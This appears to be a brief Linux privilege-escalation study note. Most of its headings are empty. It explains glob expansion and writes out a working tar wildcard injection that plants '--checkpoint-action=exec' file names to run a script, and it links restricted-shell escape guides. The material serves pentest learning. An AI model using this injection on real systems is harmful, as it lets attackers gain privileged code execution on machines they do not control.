# Important Terminology 


# Wildcard Abuse 
- Characters like *, ?, [],~ and ... are special globbing characters used to match filenames
- When a command receives a wildcard, the shell expands it into a list of matching filenames before passing them to the command
- If attacker can create files with specific names in a directory where a privileged script or command uses a wildcard, they can inject arguments

```
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```



# Restricted Shell 
[Resource-1](https://github.com/The-Red-Serpent/restricted-shell-escape-cheatsheet)

[Resource 2](https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e)

[Resource 3](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)



# Set UID/SUID Permissions 



# Sudo Rights Abuse 



# Privileged Group s
